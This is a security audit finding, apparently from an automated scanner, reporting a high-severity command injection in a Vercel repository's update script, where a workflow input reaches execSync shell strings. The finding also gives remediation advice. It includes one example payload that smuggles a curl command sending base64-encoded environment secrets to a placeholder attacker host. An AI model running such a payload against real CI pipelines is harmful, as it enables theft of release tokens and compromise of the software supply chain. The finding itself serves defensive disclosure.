# [HIGH] Command injection via newVersion parameter passed to execSync shell strings

**File:** [`utils/update-remix-run-dev.js`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/utils/update-remix-run-dev.js#L30-L67) (lines 30, 32, 64, 66, 67)
**Project:** vercel
**Severity:** HIGH  •  **Confidence:** high  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `tom.knickman@vercel.com` _(via last-committer)_

## Finding

The exported function accepts a `newVersion` string (originating from the `update-remix-run-dev.yml` workflow_dispatch input `inputs.new-version`) and interpolates it into multiple `execSync` shell strings after only calling `.replaceAll('.', '-')`. That sanitization strips dots but leaves dangerous shell metacharacters intact: `;`, `|`, `&`, backticks, `$()`, newlines, redirects, etc. At line 30 the value becomes part of `branch`, which is then injected at line 32 (`git ls-remote --heads origin ${branch}`), line 64 (`git checkout -b ${branch}`), line 66 (`git commit -m ${branch}`), and line 67 (`git push origin ${branch}`). Because `execSync` with a single string argument runs the command through `/bin/sh -c`, an input like `1.0.0;curl https://attacker/$(env|base64)` would survive the dot-replacement (becoming `1-0-0;curl ...`) and cause arbitrary commands to run. The runner has access to `secrets.VERCEL_CLI_RELEASE_BOT_TOKEN` (via `github-token`) and is invoked from `workflow_dispatch`, so anyone with permission to run the workflow can exfiltrate secrets, push arbitrary commits as the release bot, or otherwise compromise CI. This is exploitable independent of the separate (and worse) YAML injection in update-remix-run-dev.yml line 30, where `${{ inputs.new-version }}` is interpolated directly into the JS source — fixing only the YAML still leaves the JS file vulnerable for any caller.

## Recommendation

Stop interpolating `newVersion`/`branch` into shell strings entirely. Switch to `execFileSync(cmd, args, opts)` (or the `utils/exec.js` helper, which already does this for the gatsby/turbo updaters) and pass arguments as arrays: e.g., `execFileSync('git', ['ls-remote', '--heads', 'origin', branch])`. Additionally, validate `newVersion` against a strict semver regex (e.g., `/^\d+\.\d+\.\d+(-[\w.+-]+)?$/`) before using it, and reject anything that does not match. Separately, fix the workflow YAML to pass `inputs.new-version` via an `env:` variable that the inline script reads from `process.env`, instead of interpolating `${{ inputs.new-version }}` directly into the JS source.

## Recent committers (`git log`)

- Thomas Knickman <tom.knickman@vercel.com> (2026-03-11)
- Nathan Rajlich <n@n8.io> (2024-12-17)
- Trek Glowacki <trek.glowacki@vercel.com> (2024-11-21)
